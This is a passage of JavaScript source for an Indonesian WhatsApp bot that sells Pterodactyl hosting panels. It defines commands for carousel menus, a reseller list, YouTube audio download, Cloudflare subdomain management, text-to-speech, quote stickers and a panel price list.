thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case 'panel':{

const url = "https://telegra.ph/file/50a488fd1eb4a71855e30.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: inzie.waUploadToServer
  })
  return imageMessage
}


    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {},
              carouselMessage: {
                cards: [
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 1GB
  RAM   = 1125
  DISK  = 1125
  CPU   = 40` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (『𝐈𝐍𝐙𝐈𝐄』)","url":"https:\\/\\/wa.me\\/6287762845502","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 2GB
  RAM   = 2125
  DISK  = 2125
  CPU   = 60` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (『𝐈𝐍𝐙𝐈𝐄』)","url":"https:\\/\\/wa.me\\/6287762845502","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 3GB
  RAM   = 3125
  DISK  = 3125
  CPU   = 80` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (『𝐈𝐍𝐙𝐈𝐄』)","url":"https:\\/\\/wa.me\\/6287762845502","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 4GB
  RAM   = 4125
  DISK  = 4125
  CPU   = 100` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (『𝐈𝐍𝐙𝐈𝐄』","url":"https:\\/\\/wa.me\\/6287762845502","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 5GB
  RAM   = 5125
  DISK  = 5125
  CPU   = 120` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (『𝐈𝐍𝐙𝐈𝐄』)","url":"https:\\/\\/wa.me\\/6287762845502","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 6GB
  RAM   = 6125
  DISK  = 6125
  CPU   = 140` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner ( 『𝐈𝐍𝐙𝐈𝐄』)","url":"https:\\/\\/wa.me\\/6287762845502","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 7GB
  RAM   = 7125
  DISK  = 7125
  CPU   = 160` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (『𝐈𝐍𝐙𝐈𝐄』)","url":"https:\\/\\/wa.me\\/6287762845502","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 8GB
  RAM   = 8125
  DISK  = 8125
  CPU   = 180` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (『𝐈𝐍𝐙𝐈𝐄』)","url":"https:\\/\\/wa.me\\/6287762845502","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = 9GB
  RAM   = 9125
  DISK  = 9125
  CPU   = 200` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (『𝐈𝐍𝐙𝐈𝐄』)","url":"https:\\/\\/wa.me\\/6287762845502","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `  ==== PANEL PTERODACTYL ====
  PANEL = UNLI
  RAM   = 0
  DISK  = 0
  CPU   = 0` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"👤Chet Owner (『𝐈𝐍𝐙𝐈𝐄』)","url":"https:\\/\\/wa.me\\/6287762845502","webview_presentation":null}',
                        },
                      ],
                    },
                  },
                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      {}
    );

    await inzie.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
            }
break
case "trxoff": case "modeoff": {

if (!isOwner) return inzieReply(msg.owner)
global.owneroff = true
m.reply('Berhasil Mengganti Ke Mode *Owner Off*')
}
break
case "trxon": case "modeon": {

if (!isOwner) return inzieReply(msg.owner)
global.owneroff = false
m.reply('Berhasil Mengganti Ke Mode *Owner ON*')
}
break

case "addseller": {

if (!isOwner) return inzieReply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (reseller.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Sudah Terdaftar Di Database Reseller Panel!`)
await reseller.push(orang)
await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
m.reply(`Berhasil Menjadikan ${orang.split('@')[0]} Sebagai Reseller Panel`)
} else {
return m.reply(example("@tag/62838XXX"))
}}
break
case "delseller": {

if (!isOwner) return inzieReply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!reseller.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Tidak Terdaftar Di Database Reseller Panel!`)
let indx = reseller.indexOf(orang)
await reseller.splice(indx, 1)
await fs.writeFileSync("./all/all/database/reseller.json", JSON.stringify(reseller))
m.reply(`Berhasil Menghapus ${orang.split('@')[0]} Dari Database Reseller Panel`)
} else {
return m.reply(example("@tag/62838XXX"))
}}
break

case 'menu-new': {
m.reply(`𝗠𝗢𝗛𝗢𝗡 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥𝗟𝗔𝗛, 𝗞𝗔𝗥𝗘𝗡𝗔 𝗠𝗘𝗡𝗨 𝗦𝗟𝗜𝗗𝗘 𝗦𝗔𝗡𝗚𝗔𝗧 𝗕𝗘𝗥𝗔𝗧!!!`)
let name = m.pushName || inzie.getName(m.sender);
let pan = `
*Haii* @${m.sender.split("@")[0]},\nAda Yang Bisa Saya Bantu Kak?

 ┏━ ⊑ *INFO BOT* ⊒
┃ꆜ *Botname* : ${global.namabot2}
┃ꆜ *Creator* : ${global.owner}
┃ꆜ *Runtime* : ${runtime(process.uptime())}
┃ꆜ *Versi* : ${version}
┃ꆜ *Platfrom* : Chrome ( Ubuntu )
┗━━━━━━━━━━━━━━
`;
const url = "https://telegra.ph/file/50a488fd1eb4a71855e30.jpg"
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: inzie.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
                        {
                header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: inzie.waUploadToServer })) 
}), 
                body: {
                  text: `╭━━━━━━━━━━━━╮
┃      𝗔𝗟𝗟    𝗠𝗘𝗡𝗨     ┃
╰━━━┳━━━━━━━━╯
            ╰╮
           ▁▁
           ╲    ╲
    ╱▔▔▔▔▔▔▔▔╲
╱      ╱╲        ╱╲      ╲
▏      ▔▔        ▔▔      ▕
▏▕╲╱╲╱╲╱╲╱▏  ▕
╲    ╲╱╲╱╲╱╲╱    ╱
    ╲▁▁▁▁▁▁▁▁╱`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"CLICK","id":".allmenu"}`
              },
                  ],
                },
              },
                        {
                header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: inzie.waUploadToServer })) 
}), 
                body: {
                  text: `╭━━━━━━━━━━━━╮
┃     𝗠𝗔𝗜𝗡  𝗠𝗘𝗡𝗨     ┃
╰━━━┳━━━━━━━━╯
            ╰╮
           ▁▁
           ╲    ╲
    ╱▔▔▔▔▔▔▔▔╲
╱      ╱╲        ╱╲      ╲
▏      ▔▔        ▔▔      ▕
▏▕╲╱╲╱╲╱╲╱▏  ▕
╲    ╲╱╲╱╲╱╲╱    ╱
    ╲▁▁▁▁▁▁▁▁╱`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"CLICK","id":".mainmenu"}`
              },
                  ],
                },
              },
                                      {
                header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: inzie.waUploadToServer })) 
}), 
                body: {
                  text: `╭━━━━━━━━━━━━╮
┃   𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨    ┃
╰━━━┳━━━━━━━━╯
            ╰╮
           ▁▁
           ╲    ╲
    ╱▔▔▔▔▔▔▔▔╲
╱      ╱╲        ╱╲      ╲
▏      ▔▔        ▔▔      ▕
▏▕╲╱╲╱╲╱╲╱▏  ▕
╲    ╲╱╲╱╲╱╲╱    ╱
    ╲▁▁▁▁▁▁▁▁╱`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"CLICK","id":".groupmenu"}`
              },
                  ],
                },
              },
                                      {
                header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: inzie.waUploadToServer })) 
}), 
                body: {
                  text: `╭━━━━━━━━━━━━╮
┃  𝗣𝗥𝗢𝗗𝗨𝗞 𝗠𝗘𝗡𝗨  ┃
╰━━━┳━━━━━━━━╯
            ╰╮
           ▁▁
           ╲    ╲
    ╱▔▔▔▔▔▔▔▔╲
╱      ╱╲        ╱╲      ╲
▏      ▔▔        ▔▔      ▕
▏▕╲╱╲╱╲╱╲╱▏  ▕
╲    ╲╱╲╱╲╱╲╱    ╱
    ╲▁▁▁▁▁▁▁▁╱`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"CLICK","id":".produkmenu"}`
              },
                  ],
                },
              },
                                      {
                header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: inzie.waUploadToServer })) 
}), 
                body: {
                  text: `╭━━━━━━━━━━━━╮
┃     𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗     ┃
╰━━━┳━━━━━━━━╯
            ╰╮
           ▁▁
           ╲    ╲
    ╱▔▔▔▔▔▔▔▔╲
╱      ╱╲        ╱╲      ╲
▏      ▔▔        ▔▔      ▕
▏▕╲╱╲╱╲╱╲╱▏  ▕
╲    ╲╱╲╱╲╱╲╱    ╱
    ╲▁▁▁▁▁▁▁▁╱`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"CLICK","id":".downloadmenu"}`
              },
                  ],
                },
              },
                                      {
                header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: inzie.waUploadToServer })) 
}), 
                body: {
                  text: `╭━━━━━━━━━━━━╮
┃      𝗖𝗢𝗡𝗩𝗘𝗥𝗧         ┃
╰━━━┳━━━━━━━━╯
            ╰╮
           ▁▁
           ╲    ╲
    ╱▔▔▔▔▔▔▔▔╲
╱      ╱╲        ╱╲      ╲
▏      ▔▔        ▔▔      ▕
▏▕╲╱╲╱╲╱╲╱▏  ▕
╲    ╲╱╲╱╲╱╲╱    ╱
    ╲▁▁▁▁▁▁▁▁╱`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"CLICK","id":".convertmenu"}`
              },
                  ],
                },
              },
                                      {
                header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: inzie.waUploadToServer })) 
}), 
                body: {
                  text: `╭━━━━━━━━━━━━╮
┃   𝗗𝗢𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨  ┃
╰━━━┳━━━━━━━━╯
            ╰╮
           ▁▁
           ╲    ╲
    ╱▔▔▔▔▔▔▔▔╲
╱      ╱╲        ╱╲      ╲
▏      ▔▔        ▔▔      ▕
▏▕╲╱╲╱╲╱╲╱▏  ▕
╲    ╲╱╲╱╲╱╲╱    ╱
    ╲▁▁▁▁▁▁▁▁╱`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"CLICK","id":".domainmenu"}`
              },
                  ],
                },
              },
                                      {
                header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: inzie.waUploadToServer })) 
}), 
                body: {
                  text: `╭━━━━━━━━━━━━╮
┃    𝗣𝗔𝗡𝗘𝗟  𝗠𝗘𝗡𝗨   ┃
╰━━━┳━━━━━━━━╯
            ╰╮
           ▁▁
           ╲    ╲
    ╱▔▔▔▔▔▔▔▔╲
╱      ╱╲        ╱╲      ╲
▏      ▔▔        ▔▔      ▕
▏▕╲╱╲╱╲╱╲╱▏  ▕
╲    ╲╱╲╱╲╱╲╱    ╱
    ╲▁▁▁▁▁▁▁▁╱`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"CLICK","id":".panelmenu"}`
              },
                  ],
                },
              },
                                      {
                header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: inzie.waUploadToServer })) 
}), 
                body: {
                  text: `╭━━━━━━━━━━━━╮
┃    𝗣𝗨𝗦𝗛 𝗞𝗢𝗡𝗧*𝗟   ┃
╰━━━┳━━━━━━━━╯
            ╰╮
           ▁▁
           ╲    ╲
    ╱▔▔▔▔▔▔▔▔╲
╱      ╱╲        ╱╲      ╲
▏      ▔▔        ▔▔      ▕
▏▕╲╱╲╱╲╱╲╱▏  ▕
╲    ╲╱╲╱╲╱╲╱    ╱
    ╲▁▁▁▁▁▁▁▁╱`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"CLICK","id":".pushkontakmenu"}`
              },
                  ],
                },
              },
                        {
                header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: inzie.waUploadToServer })) 
}), 
                body: {
                  text: `╭━━━━━━━━━━━━╮
┃   𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥    ┃
╰━━━┳━━━━━━━━╯
            ╰╮
           ▁▁
           ╲    ╲
    ╱▔▔▔▔▔▔▔▔╲
╱      ╱╲        ╱╲      ╲
▏      ▔▔        ▔▔      ▕
▏▕╲╱╲╱╲╱╲╱▏  ▕
╲    ╲╱╲╱╲╱╲╱    ╱
    ╲▁▁▁▁▁▁▁▁╱`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"CLICK","id":".ownermenu"}`
              },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await inzie.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break

case "listseller": {

if (!isOwner) return inzieReply(msg.owner)
if (reseller.length < 1) return m.reply("Tidak Ada Reseller Panel")
let teksnya = ` LIST RESELLER PANEL⚡\n\n`
reseller.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
inzie.sendMessage(m.chat, {text: teksnya, mentions: [...reseller]}, {quoted: qtoko})
}
break
case "yts": {

if (!text) return m.reply(example("Dj Tiktok"))
await m.reply(msg.wait)
await yts(text).then(async (data) => {
if (data.all.length == 0) return m.reply(mess.error)
let teks = '\n*🔎Hasil Pencarian YOUTUBE*\n\n'
for (let i of data.all) {
teks += `*◦ Judul :* ${i.title}
*◦ Channel :* ${i.author?.name || "unknown"}
*◦ Durasi :* ${i?.timestamp || "unknown"}
*◦ Link Url :* ${i.url}\n\n`
}
m.reply(teks)
}).catch(err => m.reply(err.toString()))
}
break
case "ytmp3": case "ytdl": {

if (!text) return m.reply(example('linknya'))
if (!text.includes("https")) return m.reply("Link Tautan Tidak Valid!")
if (!text.includes("youtu")) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
var judul = `./all/tmp/${getRandom(".mp3")}`
const videoURL = text
const options = {
  quality: 'highestaudio',
  filter: 'audioonly'
}
ytdl(videoURL, options)
  .pipe(fs.createWriteStream(judul))
  .on('finish', async function () {
var ai = await yts(text)
var vid = ai.videos[0]
try {
let { title, thumbnail: thumb, timestamp, author, url } = vid
await inzie.sendMessage(m.chat, {audio: fs.readFileSync(judul), mimetype: 'audio/mpeg', contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: thumb, title: title, body: `Duration : ${timestamp} | Author : ${author.name}`, sourceUrl: null,  renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await fs.unlinkSync(judul)
} catch (e) {
await inzie.sendMessage(m.chat, {audio: fs.readFileSync(judul), mimetype: 'audio/mpeg'}, {quoted: m})
await fs.unlinkSync(judul)
}
}).on('error', (err) => {
return m.reply(err.toString())
})}
break
case "setthumb": case "setthumbnail": {

if (!isOwner) return inzieReply(msg.owner)
if (!/image/g.test(mime)) return m.reply("Kirim/Balas Foto")
await inzie.downloadAndSaveMediaMessage(qmsg, "./media/thumbnail.jpg", false)
m.reply("Berhasil Mengganti Foto Thumbnail Menu ✅")
}
break
case "setppbot": case "setpp": {

if (!isOwner) return inzieReply(msg.owner)
if (/image/g.test(mime)) {
let media = await inzie.downloadAndSaveMediaMessage(qmsg)
await inzie.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
m.reply("Berhasil Mengganti Foto Profile Bot ✅")
} else return m.reply(example('dengan mengirim foto'))}
break
case "setppbotpanjang": case "setpppanjang": {

if (!isOwner) return inzieReply(msg.owner)
if (/image/g.test(mime)) {
var medis = await inzie.downloadAndSaveMediaMessage(qmsg, 'ppbot.jpeg', false)
var { img } = await generateProfilePicture(medis)
await inzie.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil Mengganti Foto Profil Bot ✅")
} else return m.reply(example('dengan mengirim foto'))
}
break
case "setnamabot": {

if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply(example('teksnya'))
inzie.updateProfileName(text)
m.reply("Berhasil Mengganti Nama Bot ✅")
}
break
case "setbio": case "setbiobot": {

if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply(example('teksnya'))
inzie.updateProfileStatus(text)
m.reply("Berhasil Mengganti Bio Bot ✅")
}
break
case "listdomain": {

var teks = `*List Domain Yang Tersedia :*

.domain1 ${global.tld1}
.domain2 ${global.tld2}
.domain3 ${global.tld3}
.domain4 ${global.tld4}

*Contoh Cara Membuat Subdomain :*
ketik *.domain1* hostname|ipvps

*Contoh Cara Melihat Subdomain :*
ketik *.listsubdomain domain1*
`
m.reply(teks)
}
break
case "listsubdomain": case "listsubdo": {

if (!isOwner) return inzieReply(msg.owner)
if (!args[0]) return m.reply(example("domain1\n\nketik *.listdomain*\nUntuk melihat list domainnya"))
let zonenya
let apinya
let dom = args[0].toLowerCase()
if (/domain1/.test(dom)) {
zonenya = global.zone1
apinya = global.apitoken1
} else if (/domain2/.test(dom)) {
zonenya = global.zone2
apinya = global.apitoken2
} else if (/domain3/.test(dom)) {
zonenya = global.zone3
apinya = global.apitoken3
} else if (/domain4/.test(command)) {
zonenya = global.zone4
apinya = global.apitoken4
tldnya = global.tld4
}
axios.get(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,{
headers: {
Authorization: "Bearer " + `${apinya}`,
"Content-Type": "application/json",
},
}).then(async (res) => {
if (res.data.result.length < 1) return m.reply("Tidak Ada Subdomain")
var teks = `*🌐 LIST SUBDOMAIN ${dom.toUpperCase()}*\n\n*Total Subdomain :* ${res.data.result.length}\n\n`
await res.data.result.forEach(e => teks += `*Domain :* ${e.name}\n*IP :* ${e.content}\n\n`)
return m.reply(teks)
})
}
break
case "domain1": case "domain2": case "domain3": case "domain4": {

if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply(example("host|ip"))
if (!text.split("|")) return m.reply(example("host|ip"))
let zonenya
let apinya
let tldnya
let dom = args[0].toLowerCase()
if (/domain1/.test(command)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(command)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(command)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
} else if (/domain4/.test(command)) {
zonenya = global.zone4
apinya = global.apitoken4
tldnya = global.tld4
}
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
   
let raw1 = text
if (!raw1) return m.reply(example("host|ip"))
let host1 = raw1.split("|")[0].trim().replace(/[^a-z0-9.-]/gi, "")
if (!host1) return m.reply("Hostname Tidak Valid!, Hostname Hanya Mendukung Tanda Strip(-) Atau Titik(.)")
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "IP Tidak Valid!" : "Isi IP Servernya!")
await subDomain1(host1.toLowerCase(), ip1).then((e) => {
if (e['success']) m.reply(`*Subdomain Berhasil Dibuat ✅*\n\n*Domain Induk 🌐*\n${tldnya}\n*IP 📡*\n${e['ip']}\n*Subdomain 🌐*\n${e['name']}`)
else m.reply(`${e['error']}`)
})}
break
case "delsubdo": case "delsubdomain": {

if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
if (!text.split("|")) return m.reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
var [pusat, sub] = text.split("|")
var zonenya
var apinya
var tldnya
if (/domain1/.test(pusat)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(pusat)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(pusat)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
} else if (/domain4/.test(pusat)) {
zonenya = global.zone4
apinya = global.apitoken4
tldnya = global.tld4
}else return m.reply("Domain Tidak Ditemukan")
if (!sub.includes(".")) return m.reply("Format Subdomain Tidak Valid!")
var host = sub.toLowerCase()
var dom = null
var id = null
await axios.get(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`, {
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then(async (res) => {
await res.data.result.forEach((e) => {
if (e.name == host) {
dom = e.name
id = e.id
}})
})
if (dom == null && id == null) return m.reply("Subdomain Tidak Ditemukan")
await fetch(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records/${id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
}
})
m.reply(`Berhasil Menghapus Subdomain *${dom}* Dari Domain *${tldnya}*`)
}
break
case "tts": {

if (!text) return m.reply(example("Hallo saya manusia"))
if (text.length >= 300) return m.reply("Jumlah huruf harus di bawah 300!")
m.reply(msg.wait)
let id = 'id_001'
try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": id
})
inzie.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: m})
} catch (e) {
return m.reply(e.toString())
}
}
break
case "ytplay": case "play": {

if (!text) return m.reply(example('Dj tiktok'))
m.reply(msg.wait)
const { pipeline } = require('stream')
const { promisify } = require('util')
const streamPipeline = promisify(pipeline)
try {
let search = await yts(text)
let vid = search.videos[0]
let { title, thumbnail: thumb, timestamp, author, url } = vid
const audioStream = ytdl(url, {
filter: 'audioonly',
quality: 'highestaudio'})
let acak = await getRandom(".mp3")
let temp = "./all/tmp/" + acak
const writableStream = fs.createWriteStream(temp)
await streamPipeline(audioStream, writableStream)
await inzie.sendMessage(m.chat, {audio: fs.readFileSync(temp), mimetype: 'audio/mpeg', contextInfo: {externalAdReply: {thumbnailUrl: thumb, title: title, body: "Duration : "+timestamp+" | "+"Author : "+author.name, sourceUrl: url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await fs.unlinkSync(temp)
} catch (e) {
return m.reply(e.toString())
}
}
break
case "qc": {

if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
m.reply(msg.wait)
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": reswarna,
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await inzie.sendStimg(m.chat, tempnya, m, {packname: namabot})
fs.unlinkSync(`./${tempnya}`)
})
})
}
break
case "list_vps": {

let teks = `Belum Tersedia`
inzie.sendMessage(m.chat, {text: teks}, {quoted: qpayment})
}
break
case "list_domain": {

let teks = `Belum Tersedia`
inzie.sendMessage(m.chat, {text: teks}, {quoted: qpayment})
}
break
break
case "list_panel": {

const teks = `*List Harga Panel By ${namaowner} ⚡*

*📦 Ram 1GB Cpu 40%*
_Harga : Rp2000

*📦 Ram 2GB Cpu 50%*
_Harga Rp3000_

*📦 Ram 3GB Cpu 60%*
_Harga : Rp4000_

*📦 Ram 4GB Cpu 80%*
_Harga : Rp5000_

*📦 Ram 5GB Cpu 110*
_Harga Rp6000_

*📦 Ram 6GB Cpu 120%* 
_Harha Rp7000_

*📦 Ram 7GB Cpu 130%* 
_Harga Rp8000_

*📦 Ram 8GB Cpu 150%* 
_Harga Rp9000_

*📦 Promo Ram & Cpu Unlimited* 
_Harga Rp13.000_

*Keuntungan Panel :*
* Server *(High Quality)*
* Bot Auto Fast Respon
* Garansi Aktif 10 Hari
